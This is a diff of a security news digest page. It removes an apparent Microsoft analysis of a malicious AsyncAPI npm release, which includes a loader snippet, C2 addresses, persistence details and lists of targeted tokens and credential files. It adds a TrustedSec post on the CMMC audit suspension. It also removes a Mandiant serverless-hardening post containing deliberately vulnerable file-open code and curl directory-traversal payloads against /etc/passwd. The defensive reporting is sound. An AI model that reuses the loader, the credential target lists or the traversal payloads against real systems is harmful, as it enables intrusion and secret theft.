-1 2 3 4 5 6 7 8 9 | const FILE_URL = 'hxxps://ipfs[.]io/ipfs/<cid>'; const FILE_NAME = 'sync.js'; function getTargetDirectory() { if (process.platform === 'win32') return '%LOCALAPPDATA%\NodeJS'; if (process.platform === 'darwin') return '~/Library/Application Support/NodeJS'; if (process.platform === 'linux') return '~/.local/share/NodeJS'; return '~/.config/NodeJS'; } </cid> |
-Stage 2: Encrypted payload (sync.js)
-Despite appearing cryptographically sophisticated, the entire decryption chain uses static embedded key material, meaning the runtime can be recovered offline without execution. The layered design primarily increases analyst effort; every secret required to unwrap the bundle ships inside the loader.
-- sync.js is ~8.2 MB; all key material is static and embedded.
-- HKDF-SHA256 uses master string rt-vault-master-key-32b-aaaaaaaa and info string rt-file-key.
-- AES-256-GCM uses IV = first 12 bytes and auth tag = last 16 bytes of the blob.
-- The decrypted string is ROT-94de-rotated and then executed with eval().
-Stage 3: Miasma runtime
-The runtime is a command framework identified as M-RED-TEAM v6.4 with campaign configuration miasma-train-p1. In this build’s configuration, persistence and C2 are active, but data collection and propagation modules remain dormant. The runtime supports traditional remote access trojan (RAT) commands, including directory listing, file retrieval, file upload, remote shell execution, proxying, and data exfiltration. Persistence is installed through platform-specific mechanisms: a Windows HKCU Run key (miasma-monitor), a Linux systemd user unit (miasma-monitor.service), and macOS shell RC injection (.zshrc, .bashrc, or .bash_profile).
-- Recovered identifiers: M-RED-TEAM v6.4, miasma-train-p1, and miasma-test-org.
-- Persistence: Win HKCU Run value miasma-monitor, Linux miasma-monitor.service, and macOS user-space shell/launch persistence.
-- Primary endpoints: 85.137.53[.]71:8080 (C2), 85.137.53[.]71:8081 (upload), 85.137.53[.]71:8091 (management).
-- Fallback channels include Nostr, Ethereum, BitTorrent DHT, libp2p, and IPFS.
-- Disabled in the analyzed build: recon, propagation, AI-poisoning, metamorphic generation, and evasion.
-Credential harvesting (disabled in this build)
-The framework contains broad credential-access code targeting secrets across major platforms that a developer or continuous integration and continuous delivery (CI/CD) system might access, including browser-saved passwords from multiple browsers.
-The framework targets over 100 environment variable names across source control (GITHUB_TOKEN, GITLAB_TOKEN), npm (NPM_TOKEN, NODE_AUTH_TOKEN), AWS (AWS_ACCESS_KEY, AWS_SECRET_ACCESS_KEY), Azure (AZURE_CLIENT_SECRET), GCP (GCLOUD_SERVICE_KEY), container/Kubernetes (DOCKER_TOKEN, K8S_AUTH_TOKEN), secrets managers (DOPPLER_TOKEN, VAULT_TOKEN), and AI platforms (ANTHROPIC_API_KEY, OPENAI_API_KEY).
-Credential files targeted from disk include .npmrc (npm tokens), .aws/credentials (AWS keys), kubeconfig (Kubernetes API), id_rsa/id_ed25519 (SSH keys), .vault-token (HashiCorp Vault), .netrc (Git/HTTPS auth), .docker/config.json (Docker registry), and google_credentials.json (GCP service accounts). When a GITHUB_TOKEN is available, the framework can enumerate accessible repositories and CI/CD context through GitHub APIs.
-Mitigation and protection guidance
-Review dependency trees, lockfiles, artifact repositories, and CI caches for the five compromised versions, including transitive references.
-Pin known-good versions: @asyncapi/specs 6.11.1 or earlier, @asyncapi/generator 3.3.0, @asyncapi/generator-components 0.7.0, and @asyncapi/generator-helpers 1.1.0.
-Do not rely on npm install –ignore-scripts as a mitigation; this campaign executes when the module is imported, not through a lifecycle hook.
-Purge npm and yarn caches on affected developer endpoints and build hosts, especially if the compromised tarballs were written into shared CI caches.
-Hunt for sync.js and the NodeJS masquerade directory on endpoints, and investigate any detached Node.js execution that references the IPFS CID or the sync.js file name.
-Block or alert on retrieval of the specific IPFS CID and monitor for network connections to 85.137.53[.]71 on ports 8080, 8081, and 8091.
-Rotate credentials and secrets from a clean host if a build system or workstation imported a compromised version, because second-stage execution can expose tokens and build integrity.
-Ensure that Microsoft Defender Antivirus cloud-delivered protection, Microsoft Defender for Endpoint telemetry, and Microsoft Defender XDR investigation workflows are enabled across developer and CI assets.
-Update to NPM CLI to [npm CLI v11.10.0+](https://github.blog/changelog/2026-02-18-npm-bulk-trusted-publishing-config-and-script-security-now-generally-available/) or Use the NPM CLI [min-release-age](https://docs.npmjs.com/cli/v11/using-npm/config#min-release-age) feature.
-Organizations that do not rely on IPFS for business operations can reduce their attack surface by blocking public IPFS gateways (ipfs.io, dweb.link, cloudflare-ipfs.com, and others) at the network perimeter. This proactive measure removes an increasingly common payload delivery channel used in supply chain campaigns without affecting standard development workflows.
-Organizations that produce software artifacts should also review their own release hardening. Because this incident appears consistent with CI/CD pipeline abuse through GitHub Actions OIDC publishing, defenders should review token scopes, workflow approvals, protected environments, release provenance, and anomaly detection around automated package publication. Supply chain response cannot stop at host triage; it must also include verification that the release process itself has not been subverted.
-After remediation, validate recovery deliberately. Rebuild affected projects from a known-good dependency baseline, confirm that compromised hashes are absent from package caches and artifact stores, and review endpoint telemetry for any lingering sync.js, NodeJS directory artifacts, or suspicious node child processes. For development organizations that share base images or golden build runners, rebuild those images as well so future jobs do not silently inherit poisoned caches or post-compromise persistence.
-Indicators of compromise
-| Package | Version | Injected file | Tarball SHA-256 |
-| @asyncapi/specs | 6.11.2-alpha.1 | index.js | d425e4583cc6185d41e95c45eda00550045a5d1919b9a012236a4520d009dbd7 |
-| @asyncapi/specs | 6.11.2 | index.js | 9b2e65db653ca8575c9b10eefb9a80c6006404812c2ec212bf5675e3c690233b |
-| @asyncapi/generator | 3.3.1 | lib/templates/config/validator.js | bfaeb987faa6de2b5a5eb63b1233d055215b09b0349a9394f2175fd7cdf385e4 |
-| @asyncapi/generator-components | 0.7.1 | lib/utils/ErrorHandling.js | 082d733db0687dcd768104972b065d4b58cb1e6043688c6c20fa3702337f36ab |
-| @asyncapi/generator-helpers | 1.1.1 | src/utils.js | 34014776d3d3ff11bc4439b02fd7ac0f02a887eb3a052eeafff236e2f6db8ad1 |
-| Type | Indicator |
-| Publisher identity | npm-oidc-no-reply@github[.]com |
-| IPFS URL | hxxps://ipfs[.]io/ipfs/Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf |
-| IPFS CID | Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf |
-| @asyncapi/generator lib/templates/config/validator.js | b9993a8ad0518849416798cf29668256ccb96598fc4423501ccab5312812653a |
-| @asyncapi/generator-components lib/utils/ErrorHandling.js | b270bdf8e2274ea1af0a6eed74d8f10e5fe61012d6cc226a43cc7cc7fd9f6292 |
-| @asyncapi/specs index.js (alpha AND stable — identical) | 8351d251cf0b5a0bd82242deaa0a14e3e1394418d55c0f4259dac4303b79fc0c |
-| @asyncapi/generator-helpers src/utils.js | 6e78713b75bd34828d49896176627f7face7aa9036cd874f2e02d9f23a9a9c71 |
-| Wrapper – sync.js (generator-family IPFS object) | 24b9ee242f21a73b55f7bb3297eafb33c60840907386b542ed79fc6b72365168 |
-| Central C2 | 85.137.53[.]71:8080 |
-| Upload service | 85.137.53[.]71:8081 |
-| Management configuration | 85.137.53[.]71:8091 |
-| Windows drop path | %LOCALAPPDATA%\NodeJS\sync.js |
-| Linux drop path | ~/.local/share/NodeJS/sync.js |
-| macOS drop path | ~/Library/Application Support/NodeJS/sync.js |
-| Fallback drop path | ~/.config/NodeJS/sync.js |
-| Runtime lock file | ~/.config/.miasma/run/node.lock |
-| mDNS service | _miasma._tcp |
-| HTTP path examples | /api/v1/beacon, /api/v1/file-result, /api/v1/file-content/<cid> |
-Microsoft Defender XDR detections
-Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.
-| Tactic | Observed activity | Microsoft Defender coverage |
-| Initial access / Execution | Compromised packages published though GitHub Actions OIDC trusted publishing | Microsoft Defender Antivirus – Trojan:Script/Supychain.A – Trojan:JS/MiasmStealer.SC – Trojan:JS/SpawnLoader.MKV!MTB Microsoft Defender for Endpoint – Suspicious Node.js process behavior – Suspicious Node.js script execution |
-| Execution / Defense evasion | Module import triggers obfuscated main(), which spawns a hidden detached node | Microsoft Defender Antivirus – Trojan:JS/VaultLoader.MJZ!MTB Microsoft Defender for Endpoint – Suspicious Node.js process behavior – Suspicious Node.js script execution |
-| Persistence | OS-specific persistence installed | Microsoft Defender for Endpoint – Anomaly detected in ASEP registry – Suspicious modification of shell profile – Suspicious Linux service created |
-Advanced hunting queries
-Microsoft Defender XDR customers can run the following [advanced hunting](https://learn.microsoft.com/defender-xdr/advanced-hunting-overview) queries to find related activity in their networks:
-Persistence drop and detached spawn
-// Query 1: sync.js dropped under a NodeJS directory or related detached execution union isfuzzy=true ( DeviceProcessEvents | where Timestamp > ago(30d) | where (ProcessCommandLine has "sync.js" and ProcessCommandLine contains_cs "NodeJS") or ProcessCommandLine has "Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf" | project Timestamp, DeviceName, Evidence = ProcessCommandLine, Initiator = InitiatingProcessCommandLine, EventType = "Process" ), ( DeviceFileEvents | where Timestamp > ago(30d) | where FileName == "sync.js" and FolderPath contains_cs "NodeJS" | project Timestamp, DeviceName, Evidence = strcat(FolderPath, "\\", FileName), Initiator = InitiatingProcessFileName, EventType = "File" ) |
-IPFS CID retrieval
-1 2 3 4 5 6 | // Query 2: outbound retrieval of the IPFS second stage DeviceNetworkEvents | where Timestamp > ago(30d) | where RemoteUrl has "ipfs.io" | where RemoteUrl has "Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf" | project Timestamp, DeviceName, RemoteUrl, RemoteIP, InitiatingProcessFileName |
-Poisoned package artifacts in caches
-1 2 3 4 5 6 7 8 9 10 | // Query 3: presence of a poisoned tarball in caches DeviceFileEvents | where Timestamp > ago(30d) | where SHA256 in ( "d425e4583cc6185d41e95c45eda00550045a5d1919b9a012236a4520d009dbd7", "9b2e65db653ca8575c9b10eefb9a80c6006404812c2ec212bf5675e3c690233b", "bfaeb987faa6de2b5a5eb63b1233d055215b09b0349a9394f2175fd7cdf385e4", "082d733db0687dcd768104972b065d4b58cb1e6043688c6c20fa3702337f36ab", "34014776d3d3ff11bc4439b02fd7ac0f02a887eb3a052eeafff236e2f6db8ad1") | project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName |
-Suspicious Node.js execution
-1 2 3 4 5 | DeviceProcessEvents | where Timestamp > ago(3d) | where FileName in~ ("node", "node.exe") | where ProcessCommandLine has "node.exe -e \"const _0x5af5e1" or ProcessCommandLine has "node -e \"const _0x5af5e1" | project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath |
-Microsoft Security Copilot
-Security Copilot customers can use the standalone experience to create their own prompts or run prebuilt promptbooks to automate investigation and response tasks related to this threat. Useful promptbooks for this activity include Incident investigation, Microsoft User analysis, Threat actor profile, Threat Intelligence 360 report based on MDTI intelligence, and Vulnerability impact assessment. Some promptbooks require access to Microsoft Defender XDR, Microsoft Sentinel, or related Microsoft security plugins.
-For this campaign, Security Copilot can help analysts summarize affected devices, pivot from the package hashes to endpoint evidence, identify hosts that communicated with the IPFS path or C2 infrastructure, and build remediation actions such as cache purge, credential rotation, and containment sequencing for impacted developer systems and build runners.
-Threat intelligence reports
-Microsoft customers can use Microsoft Defender XDR Threat analytics and related Microsoft threat intelligence reporting to stay current on the malicious activity, indicators, detection coverage, and recommended response actions associated with this compromise. These reports provide investigation context, protection guidance, and updated intelligence that security teams can use to prevent, mitigate, or respond to related activity in customer environments.
-As with other active supply-chain investigations, defenders should monitor for updated intelligence on package status, additional affected versions, infrastructure changes, and newly surfaced post-compromise tradecraft. Microsoft will continue to incorporate validated indicators and detections into Microsoft security products as the investigation evolves.
-Learn more
-For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
-To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
-To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
-Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
-[Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)- Learn more about
-[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
-[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/).</div>
+        <div id="art-6" class="article-body">
+            <h2 class="article-title">CMMC is (Not) Cancelled</h2>
+            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/cmmc-is-not-cancelled" target="_blank">Original Link</a></p>
+            <div class="content-text">CMMC is (Not) Cancelled
+Table of contents
+Word is out that the Department of War (DoW) has [suspended the rollout of CMMC Phase II](https://www.war.gov/News/Releases/Release/Article/4542329/forging-the-arsenal-of-freedom-department-of-war-suspends-cmmc-phase-ii-require/). However, contractors working on CMMC compliance should not abandon their CMMC plans: Although the audit requirement is suspended, the rest of CMMC is still very much in effect. Read on to understand the implications of this announcement and some speculation on why the audits may have been suspended.
+TrustedSec is a CMMC RPO that helps organizations achieve CMMC compliance and has years of experience assessing compliance with NIST SP 800-171 as well as FISMA/NIST SP 800-53 assessments for federal agencies. If you need assistance with these areas, [get in touch with us](https://trustedsec.com/contact).
+Overview
+- CMMC Level 2 C3PAO audit requirements are not going to take effect as planned in November.
+- DoW is conducting a 60-day review period to determine what comes next.
+- Self-Assessment requirements for CMMC Levels 1 and 2 remain in effect.
+- FAR 52.204-21 contract requirements for safeguarding FCI remain in effect.
+- DFARS 252.204-7012 contract requirements for safeguarding CUI and reporting breaches remain in effect.
+- DFARS 252.204-7020 contract requirements for self-assessing and reporting NIST SP 800-171 compliance via SPRS remains in effect.
+- Subcontractors should be prepared to continue receiving unnecessary CMMC Level 2 audit requirements from upstream contractors that don’t understand the CMMC program or this announcement.
+- Significant False Claims Act penalties remain in effect for violating current CMMC, FAR 52.204-21, and/or DFARS 252.204-7012 requirements.
+- There are various reasons why this may have been postponed including:
+- Large contractors unnecessarily flowing down Level 2 audit requirements, leading to more contractors implementing Level 2 and seeking audits than are necessary.
+- Contractors don’t understand what CUI is and as a result, believe they require audits when they do not.
+- Contractors that should have implemented NIST SP 800-171 several years ago did not and are now scrambling to implement it before they get audited.
+- A flood of contractors are attempting to get audited all at once before the deadline.
+- DoW is accepting feedback on the CMMC program as part of the review process for 30 days following the suspension announcement.
+What Has Changed
+CMMC had a phased rollout plan, the details of which are in our previous post [A Big Step on the CMMC Rollout Timeline](https://trustedsec.com/blog/a-big-step-on-the-cmmc-rollout-timeline). The important part is that CMMC Level 2 C3PAO audit requirements were supposed to start appearing in DoW contracts at the start of Phase 2 on November 10, 2026.
+The suspension announcement means that the rollout of Level 2 C3PAO audit requirements is not going to happen, at least for now. The DoW is conducting a 60 day study to determine the future of the CMMC program.
+As the DoW is not going to put audit requirements in prime contracts, other contractors should not be putting audit requirements in their subcontracts. Effectively, CUI categories that would have been subject to a CMMC Level 2 C3PAO audit requirement will remain subject to the CMMC Level 2 Self-Assessment requirement that other CUI categories have been and remain eligible for.
+What Hasn’t Changed
+Phase 1 of the CMMC rollout already began on November 10, 2025, and the suspension announcement makes clear that the Phase 1 requirements remain in place. Phase 1 rolled out CMMC Level 1 Self-Assessments for contractors handling FCI and CMMC Level 2 Self-Assessments for contractors handling CUI.
+Contractors handling FCI must continue to implement, self-assess, and report compliance with the 15 Basic Safeguards in CMMC Level 1, and contractors handling CUI must continue to implement, self-assess, and report compliance with the 110 NIST SP 800-171r2 requirements in CMMC Level 2. More information on what CMMC level should apply to a contractor is in our previous post on [CMMC Level and Assessment Requirements for Defense Contractors](https://trustedsec.com/blog/cmmc-level-and-assessment-requirements-for-defense-contractors).
+CMMC Level 1 and 2 requirements continue to apply to subcontractors handling FCI and CUI respectively, while CMMC Level 2 also continues to apply to External Service Providers as described in our previous post on [CMMC Subcontractors and Service Providers](https://trustedsec.com/blog/cmmc-subcontractors-and-service-providers).
+Outside of CMMC, the [FAR 52.204-21](https://www.acquisition.gov/far/52.204-21) contract clause that requires the protection of FCI with the 15 basic safeguards and the [DFARS 252.204-7012](https://www.acquisition.gov/dfars/252.204-7012-safeguarding-covered-defense-information-and-cyber-incident-reporting.) contract clause that requires the protection of CUI remain in effect, as does the [DFARS 252.204-7020](https://www.acquisition.gov/dfars/252.204-7020-nist-sp-800-171dod-assessment-requirements.) contract clause that requires reporting of NIST SP 800-171 self-assessment scores via [SPRS](https://www.sprs.csd.disa.mil/).
+What May Not Change
+Contractors have imposed unnecessary and incorrect supposed CMMC audit requirements on potential subcontractors for years before the CMMC program started rolling out in November (this is explored more below under The Flow Down Problem and in our previous post [The Proliferation of “Fake” CMMC Contract Clauses](https://trustedsec.com/blog/the-proliferation-of-fake-cmmc-contract-clauses)). I do not expect these supposed requirements to stop now, even in light of the DoW announcement (If they didn’t bother to understand the CMMC flow down requirements before, why would they start now?)
+Subcontractors should be prepared to receive supposed audit requirements from upstream contractors even though the DoW is postponing the rollout of contracts with actual audit requirements. Subcontractors will need to make their own decision as to how they want to handle these unnecessary requirements (Push back on the upstream contractor, implement the requirements anyways, refuse to bid on the subcontract, etc.)
+Flying Under the Radar and Penalties
+CMMC effectively exists because many contractors handling CUI did not implement the requirements of the DFARS 252.204-7012 contract clause (whether due to ignorance, misunderstandings, or willful non-compliance), often despite submitting self-assessment results indicating they were compliant. The CMMC program was meant to fix this problem with independent audits.
+With the suspension of Level 2 audits, we are back to the honor system (at least for now) and some contractors may be tempted to go back to flying under the radar by claiming compliance to win contracts before the necessary safeguards are in place. This is a potentially very expensive move.
+A contractor that fails to comply with a government contract clause that it agreed to is subject to the False Claims Act. The Department of Justice (DOJ) has been aggressively pursuing cases related to non-compliance with contractual cybersecurity requirements. The following examples show the scale of recent settlements for non-compliance with DoW cybersecurity requirements along with the allegations that resulted in the settlements:
+[May 2025 - $8.4 million - Raytheon Companies and Nightwing Group](https://www.justice.gov/opa/pr/raytheon-companies-and-nightwing-group-pay-84m-resolve-false-claims-act-allegations-relating)
+- Non-compliance with the requirements of FAR 52.204-21 which form the basis of CMMC Level 1
+- Non-compliance with the requirements of DFARS 252.204-7012 which form the basis of CMMC Level 2
+- Failed to develop a System Security Plan (SSP) as required by NIST SP 800-171
+[September 2025 - $875,000 - Georgia Tech Research Corporation](https://www.justice.gov/opa/pr/georgia-tech-research-corporation-agrees-pay-875000-resolve-civil-cyber-fraud-litigation)
+- Failed to develop an SSP
+- NIST SP 800-171 requirements were not implemented
+- False self-assessment score was submitted to SPRS based on a fictitious environment that did not apply to any of the CUI being handled
+[December 2025 - $421,234 – Swiss Automation Inc.](https://www.justice.gov/opa/pr/illinois-precision-machining-company-agrees-pay-421234-resolve-alleged-false-claims-act)
+- NIST SP 800-171 requirements were not implemented
+[June 2026 - $507,144 – LOGZONE Inc.](https://www.justice.gov/opa/pr/alabama-defense-contractor-agrees-pay-507144-resolve-false-claims-act-liability-relating)
+- NIST SP 800-171 requirements were not implemented
+- DIBCAC assessment revealed a score of -170 on a scale of -203 to 110
+Why the Delay?
+The announcement stated that the suspension of audit requirements was to “reduce compliance barriers for small and medium sized businesses” without much more detail. During my work as a CMMC RP, I’ve noticed a few problems that have unnecessarily contributed to the increased cost of CMMC for small and medium businesses:
+The Flow Down Problem
+When CMMC was proposed, DoD estimated that 63% of defense contractors would only be subject to CMMC Level 1 Self-Assessment requirements because they will handle FCI but not CUI. Furthermore, contractors are only supposed to flow down CMMC requirements to subcontractors that are appropriate for the information being flowed down as part of a specific subcontract as follows:
+Highest Level Information Flowed Down to Subcontractor | CMMC Requirement to be Passed on to Subcontractor |
+|---|---|
+CUI received under a contract with a Level 3 (DIBCAC) requirement | Level 2 (C3PAO) |
+CUI received under a contract with a Level 2 (C3PAO) requirement | Level 2 (C3PAO) |
+All other CUI, e.g., received under a contract with a Level 2 (Self) requirement | Level 2 (Self) |
+FCI | Level 1 (Self) |
+Unfortunately, many large prime contractors have ignored the official CMMC flow down requirements. Instead, these contractors have informed all their potential subcontractors that they must have a CMMC Level 2 C3PAO audit certification to continue doing business, regardless of what information will be flowed down in a specific subcontract.
+This has led many small and medium businesses to unnecessarily implement the Level 2 requirements in preparation for an audit at great cost despite the fact that they will not handle CUI.
+The solution here is simple: prime contractors need to start keeping track of what information will be flowed down under each subcontract so that potential subcontractors can be accurately informed of the CMMC requirements that will apply to them. This is unlikely to happen as subcontractors don’t have enough leverage over prime contractors to change their behavior. Additionally, there is no enforcement mechanism for DoW to prevent prime contractors from spraying their subcontractors with unnecessary requirements.
+The CUI Misunderstanding Problem
+Identifying CUI should be simple: The government is required to apply standardized markings to all CUI before sending it to a contractor, and the government should inform contractors if any of the information the contractor creates under a contract must be marked as CUI.
+Unfortunately, many contractors don’t understand what CUI is or how it is marked. Some contractors think that any information they receive and/or create under a contract is potentially CUI. This has led to many contractors treating unmarked documents as CUI and applying a wild variety of supposed CUI markings to documents. These misunderstandings and mismarked documents ripple throughout the supply chain, causing subcontractors to think they are handling CUI when they are not.
+This problem compounds the flow down problem described above: Contractors are unnecessarily incurring the costs of Level 2 compliance because they think they are handling CUI when the information they are handling is most likely FCI, only subject to Level 1 requirements.
+Contractors should take the time to understand what CUI is and is not, both to simplify their own compliance efforts and to avoid causing further confusion among their customers and suppliers.
+The Non-Compliance Problem
+The remaining estimated 37% of contractors that actually handle CUI should have implemented the NIST SP 800-171 controls that underpin CMMC Level 2 long ago as a result of existing DFARS 252.204-7012 requirements. These contractors should also have assessed themselves against those requirements and reported their scores to the DoW via SPRS as per DFARS 252.204-7020. In this ideal world, the CMMC C3PAO audits would have been a simple check to confirm the self-assessments submitted by contractors were accurate.
+Unfortunately, many of these contractors did not implement these requirements and are now scrambling to get compliant before C3PAOs turn up evidence that the contractors have been violating their contracts for nearly a decade.
+Implementing compliance in a hurry is more expensive and more disruptive to the business than taking a methodical approach, but the looming deadline prevented a methodical approach.
+This is effectively a problem of contractor’s own making, assuming that they have been handling CUI and are therefore subject to DFARS 252.204-7012, NIST SP 800-171, and CMMC Level 2. Hindsight is 20/20, and contractors must now deal with the consequences of their failure to implement these long-standing compliance requirements.
+The All at Once Problem
+The original CMMC rollout plan states that all DoW contracts that involve handling CUI in the defense grouping after the Phase 2 start date will contain CMMC Level 2 C3PAO certification audit requirements. Contractors are, in theory, not required to have a CMMC Level 2 certification until they encounter their first contract with this requirement, which may come some time after the start of rollout Phase 2.
+Unfortunately, reality doesn’t work like this. Implementing CMMC Level 2 and getting a certification audit takes longer than the contract bidding and award process. Contractors that want to continue winning contracts must have their certification in hand well before any potential CMMC Level 2 audit requirements appear in contracts.
+This has led to a flood of contractors frantically trying to hire the few available C3PAOs to perform audits. C3PAOs have months-long backlogs and can name their own price for audits as demand vastly outstrips supply. Contractors are faced with the awful choice of paying for an overpriced audit or declining to bid on contracts with Level 2 audits requirements once Phase 2 starts.
+Perhaps the DoW should consider adjusting the CMMC rollout so that CMMC Level 2 C3PAO requirements are imposed on contractors and subcontractors based on revenue. Contractors and subcontractors with large revenues over a certain threshold could be expected to conduct audits early in the process while contractors and subcontractors below that threshold could continue self-assessing. The revenue threshold could be slowly reduced over time, eventually including all contractors and subcontractors to which the audit requirements apply. This approach is already in use in the [CCPA cybersecurity requirements](https://cppa.ca.gov/regulations/pdf/ccpa_statute_eff_20260101.pdf) rollout.
+What’s Next
+Contractors and others involved in the CMMC program can make their voice heard as the DoW’s 60-day CMMC review period begins. The DoW [published an RFI](https://sam.gov/workspace/contract/opp/89ef9bfb0834473791e991c712698d94/view) shortly after the announcement, requesting feedback from companies on how to protect federal data while reducing compliance costs. The document attached to the RFI contains seven specific questions and provides email addresses for responses. Responses are due by 12PM EST on August 14, 2026.</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-2" class="article-body">
-            <h2 class="article-title">Zoom warns of critical account takeover vulnerability</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/zoom-warns-of-critical-account-takeover-vulnerability/" target="_blank">Original Link</a></p>
-            <div class="content-text">Zoom is warning of a critical vulnerability in its desktop client and software development kit for Windows that could be exploited by an unauthenticated party to hijack accounts. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-3" class="article-body">
+        <div id="art-7" class="article-body">
             <h2 class="article-title">There and Back Again: An Operators Guide on NTLM Relaying Egress</h2>
             <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/07/15/there-and-back-again-an-operators-guide-on-ntlm-relaying-egress/" target="_blank">Original Link</a></p>
             <div class="content-text"><p>TL;DR &#8211; What’s old is new again. Remember coercing SMB NTLM egress tradecraft to crack challenge response back in the day? We see a lot of situations in our assessments where relaying NTLM from coerced network egress is ideal when escalating locally over C2 is unattainable or firewall rules are in play preventing WebDav relays [&#8230;]</p>
@@ -241,235 +498,7 @@ Review our documentation to learn more about our real-time protection capabiliti
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-4" class="article-body">
-            <h2 class="article-title">The Risk of Exposed Cloud Functions and How to Harden</h2>
-            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/exposed-cloud-functions-harden/" target="_blank">Original Link</a></p>
-            <div class="content-text">The Risk of Exposed Cloud Functions and How to Harden
-Mandiant
-Written by: Corné de Jong
-Introduction
-Mandiant security assessments frequently identify publicly exposed serverless applications that lack authentication, often as a result of specific business requirements. Serverless deployments typically run custom-developed code that incorporates third-party packages, making them targets for a wide range of application-level attacks, including:
--
-Local and Remote File Inclusion (LFI/RFI)
--
-Command Injection
-Successful exploitation of these vulnerabilities can grant an attacker full control over the underlying container instance. Such access can serve as a foothold that may ultimately lead to a full compromise of the victim’s cloud environment.
-Based on lessons learned in customer engagements, in this blog post we describe attack scenarios and provide actionable guidance on how to secure serverless environments. While this analysis focuses on hardening strategies for Google Cloud Run services and functions that must remain publicly accessible, these principles apply universally to any public serverless deployment.
-What are Serverless Applications?
-Serverless applications, also described as Function-as-a-Service (FaaS), allow the deployment of individual blocks of code as microservices within a flexible, decoupled, and event-driven cloud architecture without the need to manage underlying infrastructure. These services enable applications and automations to scale automatically and deploy instantly, removing operational overhead. Serverless services underpin major e-commerce, media, payment processing applications, and AI usage.
-The rapid expansion of generative AI adoption is a significant driver of increased serverless architecture use. AI workflows, including chatbot interactions, image generation, “vibe-coding”, and multi-step AI agents rely on serverless functions to complete tasks for users. This growth has made securing serverless environments a more pressing challenge for enterprise security teams.
-Risks of Serverless Application Attacks
-Publicly exposed serverless workloads can serve as an initial access point for threat actors. As noted, these services may contain vulnerabilities within the code, imported packages, or the underlying runtime environment.
-Once an entry point is exploited, attackers typically attempt to escalate privileges or move laterally. Common techniques observed include:
--
-Extracting secrets stored directly within the application code.
--
-Reviewing application logic and sensitive data to identify further attack vectors within the environment.
--
-Exfiltrating service account bearer tokens from the metadata server following successful Remote Code Execution (RCE).
-Leveraging these compromised secrets or service accounts allows threat actors to pivot to adjacent systems and workloads, potentially resulting in a total environment takeover if proper hardening strategies are not in place.
-Example Attack Scenarios
-The following simplified scenarios illustrate how serverless functions can be compromised and how attackers pivot after achieving initial code execution.
-Local File Inclusion (LFI)
-In the following Cloud Run example, a Python/Flask function accepts user-controlled input to open a file without performing proper validation. This pattern is an example of a Local File Inclusion (LFI) vulnerability.
-import functions_framework
-@functions_framework.http
-def hello_http(request):
-request_json = request.get_json(silent=True)
-request_args = request.args
-if request_json and 'file' in request_json:
-file = request_json['file']
-elif request_args and 'file' in request_args:
-file = request_args['file']
-# VULNERABILITY: The 'file' parameter is used directly in open()
-# without validation, allowing arbitrary file access
-with open(file, 'r') as resp:
-filedata = resp.read()
-return 'local file data {}!'.format(filedata)
-Figure 1: Vulnerable Python/Flask function accepting unvalidated user input to open files
-This vulnerability allows an attacker to request sensitive files from the Cloud Run instance by using curl
-to send a POST request via the file
-parameter:
-curl -X POST https://cloudrun01-abc.europe-west3.run.app/ -H "Content-Type: application/json" -d '{"file": "main.py"}'
-Figure 2: curl POST request targeting the file parameter
-The response provides the complete main.py
-source code. An attacker can analyze the code for:
--
-Hardcoded secrets such as API keys, database credentials, or authentication tokens
--
-Business logic flaws and additional injection points
--
-Internal service endpoints and architecture details
--
-Import statements revealing the technology stack and potential CVE exposure
-Additionally, attackers can leverage standard ../
-directory traversal sequences to retrieve sensitive system files:
-curl -X POST https://cloudrun01-abc.europe-west3.run.app/ -H "Content-Type: application/json" -d '{"file": "../../../etc/passwd"}'
-Figure 3: curl POST request leveraging directory traversal sequences
-An LFI vulnerability allows an attacker to retrieve and fuzz various files directly from the container. Key examples include:
--
-requirements.txt, package.json, go.mod
-: Used to identify installed packages and versions with known vulnerabilities. -
-.
-env
-files: Frequently contain sensitive environment variables or hard coded secrets. -
-Application configuration files: May contain database credentials, API keys, or service endpoints if not securely managed.
--
-/etc/passwd, /proc/self/environ
-: Contains user information, environment variables. -
-Application logs: may contain auth tokens or PII data.
